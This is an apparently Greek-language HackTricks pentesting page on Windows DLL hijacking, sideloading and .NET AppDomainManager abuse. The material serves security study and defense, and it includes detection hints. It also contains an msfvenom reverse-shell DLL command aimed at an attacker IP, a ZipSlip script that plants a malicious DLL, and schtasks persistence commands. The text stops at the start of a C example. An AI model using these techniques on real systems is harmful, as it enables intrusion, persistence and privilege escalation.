# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές πληροφορίες

Το DLL Hijacking περιλαμβάνει τον χειρισμό μιας έμπιστης εφαρμογής, ώστε να φορτώσει ένα κακόβουλο DLL. Ο όρος καλύπτει διάφορες τακτικές, όπως **DLL Spoofing, Injection και Side-Loading**. Χρησιμοποιείται κυρίως για code execution και επίτευξη persistence και, λιγότερο συχνά, για privilege escalation. Παρότι εδώ εστιάζουμε στο escalation, η μέθοδος hijacking παραμένει ίδια ανεξάρτητα από τον στόχο.

### Συνήθεις τεχνικές

Για το DLL hijacking χρησιμοποιούνται διάφορες μέθοδοι, καθεμία με διαφορετική αποτελεσματικότητα ανάλογα με τη στρατηγική φόρτωσης DLL της εφαρμογής:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, με δυνατότητα χρήσης DLL Proxying για τη διατήρηση της λειτουργικότητας του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε μια διαδρομή αναζήτησης που προηγείται της νόμιμης, εκμεταλλευόμενοι τη σειρά αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL για να το φορτώσει μια εφαρμογή, θεωρώντας ότι πρόκειται για ένα ανύπαρκτο απαιτούμενο DLL.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης, όπως το `%PATH%`, ή αρχείων `.exe.manifest` / `.exe.local`, ώστε η εφαρμογή να κατευθυνθεί στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο αντίστοιχο στον κατάλογο WinSxS, μέθοδος που συχνά συνδέεται με το DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε κατάλογο ελεγχόμενο από τον χρήστη, μαζί με την αντιγραμμένη εφαρμογή, με τρόπο που θυμίζει τεχνικές Binary Proxy Execution.

Μια εφαρμογή μπορεί επίσης να υλοποιεί τον **δικό της DLL loader**. Μια προνομιούχα διεργασία μπορεί να απαριθμεί έναν υποκατάλογο, όπως `Libraries` ή `Plugins`, και να περνά ένα επιλεγμένο DLL σε ένα βοηθητικό πρόγραμμα, ανεξάρτητα από τη συνήθη σειρά αναζήτησης DLL των Windows. Αν ένας άλλος λογαριασμός μπορεί να δημιουργεί αρχεία στον συγκεκριμένο κατάλογο, αντιμετωπίστε το ως ένδειξη προς διερεύνηση: επιβεβαιώστε την ταυτότητα της διεργασίας, τα πραγματικά ACL του καταλόγου, τον κανόνα επιλογής αρχείων και αν υπάρχει προσβάσιμη λειτουργία φόρτωσης. Το ότι ένας κατάλογος δίπλα σε ένα εκτελέσιμο αρχείο είναι εγγράψιμος δεν αποδεικνύει ότι η διεργασία φορτώνει DLL από εκεί.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

Το κλασικό side-loading αφήνει το έμπιστο PE αμετάβλητο και υπερισχύει στην επίλυση ονομάτων DLL. Αντίθετα, το **Import grafting** τροποποιεί ένα PE που έχει ήδη φορτωθεί από το έμπιστο πρόγραμμα. Ο επιτιθέμενος προσθέτει έναν import descriptor και τις σχετικές εγγραφές lookup/IAT για ένα DLL που ελέγχει. Όταν τα Windows επιλύουν αναδρομικά αυτήν την εξάρτηση, αντιστοιχίζουν το νέο DLL στη μνήμη και εκτελούν τον κώδικα αρχικοποίησής του μέσα στην κατά τα άλλα νόμιμη διεργασία. Πρόκειται για τροποποίηση PE στον δίσκο και όχι για την αντικατάσταση ενός δείκτη συνάρτησης της ζωντανής IAT με ένα hook κατά την εκτέλεση.<sup>[[31]](#references)[[32]](#references)</sup>

Το τροποποιημένο PE μπορεί να είναι μια ενδιάμεση DLL προμηθευτή και όχι το εκτελέσιμο αρχείο που εκκινεί ο χρήστης ή το Task Scheduler. Μια αλυσίδα που μπορεί να επαναχρησιμοποιηθεί είναι η εξής:<sup>[[32]](#references)</sup>

1. Αντιγράψτε το νόμιμο εκτελέσιμο αρχείο και τις εξαρτήσεις του σε έναν κατάλογο που ελέγχει ο επιτιθέμενος.
2. Επιδιορθώστε τις δομές import μιας εξάρτησης ώστε να αναφέρονται στο κακόβουλο DLL, διατηρώντας παράλληλα τα αναμενόμενα exports και την κανονική συμπεριφορά της εξάρτησης.
3. Διαμορφώστε μια αυτόματη εκκίνηση ή μια προγραμματισμένη εργασία ώστε να ξεκινά το νόμιμο εκτελέσιμο αρχείο. Ο loader αντιστοιχίζει στη μνήμη την τροποποιημένη εξάρτηση και έπειτα το νεοεισαχθέν DLL. Για την απαρίθμηση εργασιών, δείτε το [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks).
4. Μην εκτελείτε χρονοβόρες εργασίες μέσα στο `DllMain`· ο loader που παρατηρήθηκε δημιούργησε ένα worker thread και συνέχισε εκεί τη σταδιακή αποκρυπτογράφηση.

Αυτό διαφέρει από παραβίαση της εφοδιαστικής αλυσίδας από την πλευρά του προμηθευτή, όταν το πακέτο του προμηθευτή είναι καθαρό και η τροποποίηση import γίνεται μετά την εγκατάσταση. Κατά την αρχική διερεύνηση, ελέγξτε κάθε module στον ενδιάμεσο κατάλογο και όχι μόνο το host EXE: συγκρίνετε τις λίστες import και τα hash των εξαρτήσεων με μια γνωστή ως καλή εγκατάσταση, επαληθεύστε τις υπογραφές και διερευνήστε τα binaries προμηθευτών που εκκινούνται από απροσδόκητες εγγράψιμες τοποθεσίες, όπως το `C:\ProgramData`. Μια προγραμματισμένη εργασία που δείχνει σε ένα αντιγραμμένο πρόγραμμα αναφοράς σφαλμάτων ή πρόγραμμα ενημέρωσης σε έναν τέτοιο κατάλογο αποτελεί ιδιαίτερα χρήσιμο σημείο για περαιτέρω διερεύνηση.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Το κλασικό DLL sideloading δεν είναι ο μόνος τρόπος για να φορτωθεί κώδικας ελεγχόμενος από τον επιτιθέμενο σε μια έμπιστη διεργασία **.NET Framework**. Αν το εκτελέσιμο αρχείο-στόχος είναι **managed** εφαρμογή, το CLR εξετάζει επίσης ένα **αρχείο διαμόρφωσης εφαρμογής** με όνομα ίδιο με αυτό του εκτελέσιμου αρχείου (για παράδειγμα, `Setup.exe.config`). Αυτό το αρχείο μπορεί να ορίζει ένα προσαρμοσμένο **AppDomainManager**. Αν η διαμόρφωση δείχνει σε ένα assembly που ελέγχει ο επιτιθέμενος και βρίσκεται δίπλα στο EXE, το CLR το φορτώνει **πριν από τη συνήθη ροή εκτέλεσης της εφαρμογής** και εκτελείται μέσα στην έμπιστη διεργασία.<sup>[[24]](#references)</sup>

Σύμφωνα με το σχήμα διαμόρφωσης του .NET Framework της Microsoft, πρέπει να υπάρχουν τόσο το `<appDomainManagerAssembly>` όσο και το `<appDomainManagerType>` για να χρησιμοποιηθεί ο προσαρμοσμένος manager.<sup>[[16]](#references)[[17]](#references)</sup>

Ελάχιστη διαμόρφωση:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Ελάχιστος διαχειριστής:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Πρακτικές σημειώσεις:
- Αυτή η τεχνική αφορά **μόνο το .NET Framework**. Βασίζεται στην ανάλυση ρυθμίσεων του CLR και όχι στη σειρά αναζήτησης DLL του Win32.
- Ο host πρέπει να είναι πράγματι **managed EXE**. Γρήγορος έλεγχος: `sigcheck -m target.exe`, `corflags target.exe` ή έλεγχος για το **CLR Runtime Header** στα μεταδεδομένα PE.
- Το όνομα του αρχείου ρυθμίσεων πρέπει να ταιριάζει ακριβώς με το όνομα του εκτελέσιμου (`<binary>.config`) και συνήθως βρίσκεται **δίπλα στο EXE**.
- Αυτό είναι χρήσιμο με **υπογεγραμμένα δυαδικά αρχεία της Microsoft/προμηθευτών**, επειδή το έμπιστο EXE παραμένει ανέπαφο, ενώ το κακόβουλο managed assembly εκτελείται εντός της ίδιας διεργασίας.
- Αν έχετε ήδη έναν εγγράψιμο κατάλογο εγκατάστασης/ενημερώσεων, το AppDomainManager hijacking μπορεί να χρησιμοποιηθεί ως **πρώτο στάδιο**, ακολουθούμενο από κλασικό DLL sideloading ή reflective loading για τα επόμενα στάδια.

### Υπογεγραμμένος τύπος AppDomainManager ως gadget αρχείου ρυθμίσεων

Το συνηθισμένο config hijack του AppDomainManager παραπάνω δείχνει σε ένα assembly του επιτιθέμενου. Μια διαφορετική διαδρομή του .NET Framework χρησιμοποιεί ένα **υπογεγραμμένο assembly**, το οποίο τοποθετείται δίπλα στον host ή είναι με άλλον τρόπο δυνατό να επιλυθεί, και ο τύπος manager του διαβάζει δεδομένα sidecar που ελέγχει ο επιτιθέμενος. Ο επιτιθέμενος εξακολουθεί να χρειάζεται έλεγχο του παρακείμενου `.exe.config` του managed host και των δευτερευόντων αρχείων· η υπογραφή του επιλεγμένου assembly δεν καθιστά ασφαλή την είσοδο ρυθμίσεών του. Ο μηχανισμός ρυθμίσεων βασίζεται στην καθιερωμένη συμπεριφορά του AppDomainManager, ενώ η παρακάτω αλυσίδα με υπογεγραμμένο τύπο παρατηρήθηκε στην ανάλυση του NetamLoader.<sup>[[16]](#references)[[17]](#references)[[35]](#references)</sup>

Σε αυτή την αλυσίδα, η ρύθμιση επιλέγει το `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration` από το `Microsoft.HostIntegration.Connectors`. Κατά την αρχικοποίησή του αναζητά το `fabric.config` στον κατάλογο της εφαρμογής. Μια καταχώριση `customType` ορίζει το `System.Resources.ResXResourceSet` και παρέχει το `Resources.resx` ως όρισμα του constructor του, οδηγώντας σε έναν parser πόρων χωρίς να χρειάζεται να συμπεριληφθεί ένα DLL manager κατασκευασμένο από τον επιτιθέμενο. Αυτό απαιτεί να επιλυθούν στον στόχο το υπογεγραμμένο assembly που σχετίζεται με το AppFabric και οι ονομασμένες κλάσεις του framework· δεν αποτελεί καθολική ιδιότητα οποιουδήποτε managed EXE.<sup>[[35]](#references)</sup> Ένα ρυθμισμένο AppDomainManager απαιτεί επίσης εφαρμογή πλήρους εμπιστοσύνης· διαφορετικά, το CLR προκαλεί `TypeLoadException`.<sup>[[16]](#references)[[17]](#references)</sup>

```xml
<!-- in <host>.exe.config -->
<configuration>
  <runtime>
    <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration" />
    <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
  </runtime>
</configuration>
```

```xml
<!-- adjacent fabric.config -->
<section name="foo">
  <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

Το περιεχόμενο του `Resources.resx` είναι το sink της deserialization και όχι απλώς ένα αρχείο δεδομένων· δείτε [RESX to BinaryFormatter and XAML](../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml). Στο αναφερόμενο στάδιο, ο XAML loader αντλούσε επίσης το AES key από το SHA-256 hash της **πλήρους γραμμής εντολών του host, μετατρεμμένης σε πεζά**, και χρησιμοποιούσε τα πρώτα 16 bytes του decoded blob ως IV. Επομένως, η επανάληψη της διαδικασίας με τα αρχεία και διαφορετική γραμμή εντολών αποτυγχάνει στην αποκρυπτογράφηση πριν φορτωθεί το επόμενο XAML.<sup>[[35]](#references)</sup>

### AppDomainManager ως downloader + bootstrap για scheduled task

Ένα πρακτικό μοτίβο intrusion είναι ο συνδυασμός ενός έμπιστου managed EXE με ένα κακόβουλο `*.config` και ένα κακόβουλο AppDomainManager DLL, το οποίο λειτουργεί μόνο ως **μικρό bootstrapper**:<sup>[[25]](#references)</sup>

1. Ο χρήστης εκκινεί ένα υπογεγραμμένο .NET installer ή updater από μια πειστική τοποθεσία, όπως το `%USERPROFILE%\Downloads`.
2. Το παρακείμενο config κάνει το CLR να φορτώσει το assembly του attacker **πριν ξεκινήσει η νόμιμη λογική της εφαρμογής**.
3. Ο κακόβουλος manager εφαρμόζει ένα **path gate** (για παράδειγμα, συνεχίζει μόνο αν το host EXE εκτελείται από το `Downloads` και επιτρέπει την εκτέλεση του second stage μόνο από το `%LOCALAPPDATA%`).
4. Αν ο έλεγχος περάσει, κατεβάζει το πραγματικό payload σε μια διαδρομή εγγράψιμη από τον χρήστη, όπως το `%LOCALAPPDATA%\PerfWatson2.exe`, και εγκαθιστά persistence με scheduled task.

Γιατί έχει σημασία αυτή η παραλλαγή:
- Το υπογεγραμμένο host EXE παραμένει αμετάβλητο, επομένως το triage που ελέγχει μόνο τα hashes του κύριου binary μπορεί να μην εντοπίσει την παραβίαση.
- Η απλή **ανάλυση βάσει path** είναι συνηθισμένη: η μετακίνηση της τριάδας ZIP/EXE/DLL στην επιφάνεια εργασίας, στον φάκελο Temp ή σε μια διαδρομή sandbox μπορεί να διακόψει σκόπιμα την αλυσίδα.
- Το AppDomainManager DLL του πρώτου σταδίου μπορεί να παραμείνει μικρό και χαμηλού θορύβου, ενώ το πραγματικό implant γίνεται fetch αργότερα.

Ελάχιστο παράδειγμα persistence που συναντάται συχνά με αυτό το μοτίβο:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Σημειώσεις:
- Το ` /rl highest` σημαίνει **το υψηλότερο διαθέσιμο** για τον συγκεκριμένο χρήστη/συνεδρία· από μόνο του δεν εγγυάται κλιμάκωση σε SYSTEM.
- Αυτή η τεχνική συχνά ταξινομείται καλύτερα ως **εκτέλεση/μονιμότητα μέσω κατάχρησης ρυθμίσεων .NET** παρά ως κλασικό missing-DLL search-order hijacking, παρόλο που οι operators συχνά συνδυάζουν και τα δύο.

Ενδείξεις για εντοπισμό:
- Υπογεγραμμένα εκτελέσιμα .NET που εκκινούν από **διαδρομές εξαγωγής ZIP**, `Downloads`, `%TEMP%` ή άλλους φακέλους στους οποίους μπορεί να γράψει ο χρήστης, με ένα **συνοδευτικό** `<exe>.config`.
- Νέες προγραμματισμένες εργασίες των οποίων η ενέργεια δείχνει σε `%LOCALAPPDATA%`, `%APPDATA%` ή `Downloads` και των οποίων τα ονόματα μιμούνται προγράμματα ενημέρωσης browser/vendor.
- Βραχύβιες διαχειριζόμενες διεργασίες bootstrap που κατεβάζουν αμέσως ένα άλλο EXE και, στη συνέχεια, εκκινούν το `schtasks.exe`.
- Δείγματα που τερματίζονται πρόωρα, εκτός αν η διαδρομή του εκτελέσιμου αντιστοιχεί σε έναν αναμενόμενο κατάλογο προφίλ χρήστη.

### Hijacking υπάρχουσας προγραμματισμένης εργασίας για επανεκκίνηση της αλυσίδας sideload

Για μονιμότητα, μην ψάχνετε μόνο για **δημιουργία νέας εργασίας**. Ορισμένες ομάδες εισβολών περιμένουν να δημιουργήσει ένα νόμιμο πρόγραμμα εγκατάστασης μια **κανονική εργασία ενημέρωσης** και, στη συνέχεια, **ξαναγράφουν την ενέργεια της εργασίας**, ώστε το υπάρχον όνομα, ο δημιουργός και το trigger να φαίνονται οικεία στους αμυνόμενους.

Επαναχρησιμοποιήσιμη ροή εργασιών:
1. Εγκαταστήστε/εκτελέστε το νόμιμο λογισμικό και εντοπίστε την εργασία που συνήθως δημιουργεί.
2. Εξαγάγετε το XML της εργασίας και σημειώστε τις τρέχουσες τιμές `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Αντικαταστήστε μόνο την ενέργεια, ώστε η εργασία να εκκινεί το **έμπιστο host EXE** από έναν προσωρινό κατάλογο στον οποίο μπορεί να γράψει ο χρήστης· στη συνέχεια, αυτό φορτώνει μέσω sideload ή AppDomain το πραγματικό payload.
4. Καταχωρίστε ξανά την εργασία με το ίδιο όνομα, αντί να δημιουργήσετε ένα νέο, προφανές τεχνούργημα μονιμότητας.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Γιατί είναι πιο διακριτικό:
- Το όνομα της εργασίας μπορεί να φαίνεται νόμιμο (για παράδειγμα, πρόγραμμα ενημέρωσης προμηθευτή).
- Το εκκινεί η **υπηρεσία Task Scheduler**, επομένως η επικύρωση γονικής διεργασίας/προγόνων συχνά εντοπίζει την αναμενόμενη αλυσίδα προγραμματισμού αντί για το `explorer.exe`.
- Οι ομάδες DFIR που αναζητούν μόνο **νέα ονόματα εργασιών** μπορεί να μην εντοπίσουν μια εργασία της οποίας η καταχώριση προϋπήρχε, αλλά η ενέργειά της δείχνει πλέον σε `%LOCALAPPDATA%`, `%APPDATA%` ή σε άλλη διαδρομή υπό τον έλεγχο του επιτιθέμενου.

Γρήγορα σημεία αναζήτησης:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Συγκρίνετε τα XML των `C:\Windows\System32\Tasks\*` και τα μεταδεδομένα του `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` με μια baseline.
- Δημιουργήστε ειδοποίηση όταν μια **εργασία ενημέρωσης που μοιάζει να ανήκει σε προμηθευτή** εκτελείται από **εγγράψιμους από τον χρήστη καταλόγους** ή εκκινεί ένα .NET EXE με παρακείμενο αρχείο `*.config`.

> [!TIP]
> Για μια αλυσίδα βήμα προς βήμα που συνδυάζει HTML staging, ρυθμίσεις AES-CTR και .NET implants με DLL sideloading, δείτε την παρακάτω ροή εργασίας.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Σύνδεση ενός side-loaded stage με τη γραμμή εντολών της υπηρεσίας

Ένα side-loaded DLL μπορεί να απαιτεί περισσότερα από το αναμενόμενο όνομα host EXE και DLL. Η Mandiant περιέγραψε έναν loader που συνδέει την αποκρυπτογράφηση payload με ένα όρισμα γραμμής εντολών και το όνομα του host executable.<sup>[[33]](#references)</sup> Σε μια μεταγενέστερη αλυσίδα που βασιζόταν σε υπηρεσία, ένα αντιγραμμένο νόμιμο host φόρτωσε ένα παρακείμενο `mscoree.dll`, το οποίο εξήγαγε το `LockClrVersion` και αποκρυπτογραφούσε το ενσωματωμένο stage μόνο αφού παρήγαγε ένα κλειδί AES-128 από το όρισμα της υπηρεσίας και το βασικό όνομα του host executable. Κάθε είσοδος περικόπτονταν ή συμπληρωνόταν με NUL σε 16 bytes· το κλειδί byte προς byte ήταν `argument XOR embedded_key XOR executable_basename` και, στη συνέχεια, το payload αποκρυπτογραφούνταν με AES-CBC χωρίς padding. Η μετονομασία του host ή η εκκίνησή του χωρίς το αναμενόμενο όρισμα αλλάζει το κλειδί και εμποδίζει την αποκρυπτογράφηση αυτού του stage, ακόμη κι αν το DLL εξακολουθεί να φορτώνεται. Διατηρήστε το ακριβές όρισμα γραμμής εντολών και το βασικό όνομα όταν αναπαράγετε ή αναλύετε αυτήν την παραλλαγή.<sup>[[34]](#references)</sup>

Αυτό είναι ένα **payload gate που προστίθεται στο συνηθισμένο DLL side-loading**, όχι ένας νέος κανόνας σειράς αναζήτησης DLL ή μια τεχνική κλιμάκωσης προνομίων από μόνο του. Το επίπεδο προνομίων που προκύπτει καθορίζεται από το πλαίσιο ασφαλείας της υπηρεσίας. Η ροή εργασίας [GitHub issue/file C2](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) τεκμηριώνει ξεχωριστά τη μεταγενέστερη μεταφορά.<sup>[[34]](#references)</sup>

## Εύρεση DLL που λείπουν

Ο πιο συνηθισμένος τρόπος εντοπισμού DLL που λείπουν σε ένα σύστημα είναι να εκτελέσετε το [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από τα sysinternals, **ορίζοντας** τα **2 ακόλουθα φίλτρα**:

![Συνήθεις τεχνικές - Εύρεση DLL που λείπουν: Ο πιο συνηθισμένος τρόπος εντοπισμού DLL που λείπουν σε ένα σύστημα είναι να εκτελέσετε το procmon από τα sysinternals, ορίζοντας τα 2 ακόλουθα φίλτρα](<../../../images/image (961).png>)

![Συνήθεις τεχνικές - Εύρεση DLL που λείπουν: Ο πιο συνηθισμένος τρόπος εντοπισμού DLL που λείπουν σε ένα σύστημα είναι να εκτελέσετε το procmon από τα sysinternals, ορίζοντας τα 2 ακόλουθα φίλτρα](<../../../images/image (230).png>)

και απλώς να εμφανίσετε τη **δραστηριότητα συστήματος αρχείων**:

![Συνήθεις τεχνικές - Εύρεση DLL που λείπουν: και απλώς να εμφανίσετε τη δραστηριότητα συστήματος αρχείων](<../../../images/image (153).png>)

Αν αναζητάτε **DLL που λείπουν γενικά**, **αφήστε** το να εκτελείται για μερικά **δευτερόλεπτα**.\
Αν αναζητάτε ένα **DLL που λείπει από συγκεκριμένο εκτελέσιμο αρχείο**, ορίστε ένα ακόμη φίλτρο, όπως **"Process Name" "contains" `<exec name>`**, εκτελέστε το και σταματήστε την καταγραφή συμβάντων.<sup>[[9]](#references)</sup>

## Εκμετάλλευση DLL που λείπουν

Για να κλιμακώσετε προνόμια, αναζητήστε ένα **DLL που επιχειρεί να φορτώσει μια διεργασία με αυξημένα προνόμια** από μια τοποθεσία στην οποία έχετε δικαίωμα εγγραφής. Αυτό μπορεί να συμβεί όταν ελέγχετε έναν κατάλογο που αναζητείται πριν από τον κατάλογο που περιέχει το νόμιμο DLL ή όταν το ζητούμενο DLL δεν υπάρχει και μπορείτε να γράψετε σε έναν από τους καταλόγους που αναζητούνται.

### Σειρά αναζήτησης DLL

**Στην** [**τεκμηρίωση της Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείτε να δείτε πώς φορτώνονται συγκεκριμένα τα DLL.**

Οι **εφαρμογές Windows** αναζητούν DLL ακολουθώντας ένα σύνολο **προκαθορισμένων διαδρομών αναζήτησης**, με συγκεκριμένη σειρά. Το πρόβλημα του DLL hijacking προκύπτει όταν ένα κακόβουλο DLL τοποθετείται στρατηγικά σε έναν από αυτούς τους καταλόγους, ώστε να φορτωθεί πριν από το αυθεντικό DLL. Ένας τρόπος αποτροπής είναι να διασφαλίσετε ότι η εφαρμογή χρησιμοποιεί απόλυτες διαδρομές όταν αναφέρεται στα DLL που χρειάζεται.

Παρακάτω μπορείτε να δείτε τη **σειρά αναζήτησης DLL σε συστήματα 32-bit**:

1. Ο κατάλογος από τον οποίο φορτώθηκε η εφαρμογή.
2. Ο κατάλογος συστήματος. Χρησιμοποιήστε τη συνάρτηση [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) για να λάβετε τη διαδρομή αυτού του καταλόγου.(_C:\Windows\System32_)
3. Ο κατάλογος συστήματος 16-bit. Δεν υπάρχει συνάρτηση που να επιστρέφει τη διαδρομή αυτού του καταλόγου, αλλά αυτός αναζητείται. (_C:\Windows\System_)
4. Ο κατάλογος Windows. Χρησιμοποιήστε τη συνάρτηση [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) για να λάβετε τη διαδρομή αυτού του καταλόγου.
   1. (_C:\Windows_)
5. Ο τρέχων κατάλογος.
6. Οι κατάλογοι που παρατίθενται στη μεταβλητή περιβάλλοντος PATH. Σημειώστε ότι δεν περιλαμβάνεται η διαδρομή ανά εφαρμογή που καθορίζεται από το κλειδί μητρώου **App Paths**. Το κλειδί **App Paths** δεν χρησιμοποιείται κατά τον υπολογισμό της διαδρομής αναζήτησης DLL.

Αυτή είναι η **προεπιλεγμένη** σειρά αναζήτησης με ενεργοποιημένο το **SafeDllSearchMode**. Όταν είναι απενεργοποιημένο, ο τρέχων κατάλογος μεταφέρεται στη δεύτερη θέση. Για να απενεργοποιήσετε αυτήν τη λειτουργία, δημιουργήστε την τιμή μητρώου **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και ορίστε την σε 0 (η προεπιλογή είναι ενεργοποιημένη).

Αν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) κληθεί με το **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση ξεκινά από τον κατάλογο της μονάδας εκτελέσιμου αρχείου που φορτώνει το **LoadLibraryEx**.

Τέλος, ένα DLL μπορεί να φορτωθεί με απόλυτη διαδρομή αντί με το όνομά του. Σε αυτήν την περίπτωση, τα Windows αναζητούν το ίδιο το DLL μόνο σε αυτήν τη διαδρομή· οι εξαρτήσεις που ζητούνται με όνομα εξακολουθούν να ακολουθούν την κατάλληλη σειρά αναζήτησης.

Υπάρχουν και άλλοι τρόποι τροποποίησης της σειράς αναζήτησης, αλλά δεν θα τους εξηγήσω εδώ.

### Συνδυασμός αυθαίρετης εγγραφής αρχείου με hijack DLL που λείπει

**Σχετική τεχνική:** [εναλλαγή mount-point με oplock κατά την προνομιακή αποκατάσταση](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Χρησιμοποιήστε φίλτρα **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) για να συλλέξετε ονόματα DLL που αναζητά η διεργασία, αλλά δεν βρίσκει.<sup>[[14]](#references)</sup>
2. Αν το binary εκτελείται **προγραμματισμένα/ως υπηρεσία**, η τοποθέτηση ενός DLL με ένα από αυτά τα ονόματα στον **κατάλογο της εφαρμογής** (θέση #1 στη σειρά αναζήτησης) θα το φορτώσει στην επόμενη εκτέλεση. Σε μία περίπτωση .NET scanner, η διεργασία αναζήτησε το `hostfxr.dll` στο `C:\samples\app\` πριν φορτώσει το πραγματικό αντίγραφο από το `C:\Program Files\dotnet\fxr\...`.
3. Δημιουργήστε ένα payload DLL (π.χ. reverse shell) με οποιοδήποτε export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Αν το primitive σας είναι **αυθαίρετη εγγραφή τύπου ZipSlip**, δημιουργήστε ένα ZIP του οποίου η καταχώριση διαφεύγει από τον κατάλογο εξαγωγής, ώστε το DLL να καταλήξει στον φάκελο της εφαρμογής:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Παραδώστε το archive στο παρακολουθούμενο inbox/share· όταν η scheduled task επανεκκινήσει τη διεργασία, αυτή φορτώνει το κακόβουλο DLL και εκτελεί τον κώδικά σας ως λογαριασμός υπηρεσίας.

### Εξαναγκασμός sideloading μέσω RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προηγμένος τρόπος για να επηρεάσετε με ντετερμινιστικό τρόπο τη διαδρομή αναζήτησης DLL μιας νέας διεργασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS κατά τη δημιουργία της διεργασίας μέσω των native APIs του ntdll. Αν ορίσετε εδώ έναν κατάλογο που ελέγχετε, μπορείτε να αναγκάσετε μια διεργασία-στόχο που αναζητά ένα εισαγόμενο DLL με βάση το όνομά του (χωρίς απόλυτη διαδρομή και χωρίς χρήση των safe loading flags) να φορτώσει ένα κακόβουλο DLL από αυτόν τον κατάλογο.

Βασική ιδέα
- Δημιουργήστε τις παραμέτρους διεργασίας με το RtlCreateProcessParametersEx και ορίστε ένα προσαρμοσμένο DllPath που δείχνει στον φάκελο που ελέγχετε (π.χ. τον κατάλογο όπου βρίσκεται το dropper/unpacker σας).
- Δημιουργήστε τη διεργασία με το RtlCreateUserProcess. Όταν το target binary αναζητήσει ένα DLL με βάση το όνομά του, ο loader θα χρησιμοποιήσει το DllPath που ορίσατε κατά την αναζήτηση, επιτρέποντας αξιόπιστο sideloading ακόμη και όταν το κακόβουλο DLL δεν βρίσκεται στον ίδιο κατάλογο με το target EXE.

Σημειώσεις/περιορισμοί
- Αυτό επηρεάζει τη child process που δημιουργείται· διαφέρει από το SetDllDirectory, το οποίο επηρεάζει μόνο την τρέχουσα διεργασία.
- Ο στόχος πρέπει να εισάγει ή να φορτώνει με LoadLibrary ένα DLL με βάση το όνομά του (χωρίς απόλυτη διαδρομή και χωρίς χρήση των LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Τα KnownDLLs και οι hardcoded απόλυτες διαδρομές δεν μπορούν να γίνουν hijack. Τα forwarded exports και το SxS μπορεί να αλλάξουν τη σειρά προτεραιότητας.

Ελάχιστο παράδειγμα C (ntdll, wide strings, απλοποιημένος χειρισμός σφαλμάτων):

<details>
<summary>Πλήρες παράδειγμα C: εξαναγκασμός DLL sideloading μέσω RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
